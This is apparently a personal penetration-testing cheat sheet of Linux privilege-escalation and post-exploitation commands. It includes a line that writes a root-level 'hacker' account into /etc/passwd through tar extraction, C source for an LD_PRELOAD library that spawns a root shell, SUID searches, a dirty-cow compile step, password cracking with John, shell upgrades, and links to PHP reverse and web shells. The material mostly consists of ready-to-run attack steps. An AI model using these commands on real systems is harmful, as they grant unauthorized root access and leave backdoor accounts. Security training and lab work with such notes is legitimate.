# Tracking the Various Tips and Tracks learned along the way


### Adding a user to /etc/passwd  

```bash
echo hacker:$(( echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> passwd
tar -cvf passwd.tar passwd
tar -xvf passwd.tar -C /etc/
```

### Finding SUID   

- `find / -perm -u=s -type f 2>/dev/null`
- `find / -type f -perm -4000 2>/dev/null`

  
### Compiling a shell  

```c
/*
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
used to LD_PRELOAD shell.so
*/

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
EOF
```

`gcc cowroot.c -o cowroot -pthread`
### Cracking Passwords with John  

- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format:RAW-SHA1`
- `john --list=formats`
- [Hash Formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)
- [hash-identifier](https://hashes.com/en/tools/hash_identifier)

### Cracking Passwords with Hashcat

- [Examples](https://hashcat.net/wiki/doku.php?id=example_hashes)

### Upgrading a shell

- `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- `python -c 'import pty; pty.spawn("/bin/sh")'`

### Reverse Shells

- https://github.com/flozz/p0wny-shell
- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### Nmap Scans

- `sudo nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p-`

### File Transferring

- `python3 -m http.server 80`

### Wordpress Vulnerability Scans

`wpscan --url 10.x.x.x`
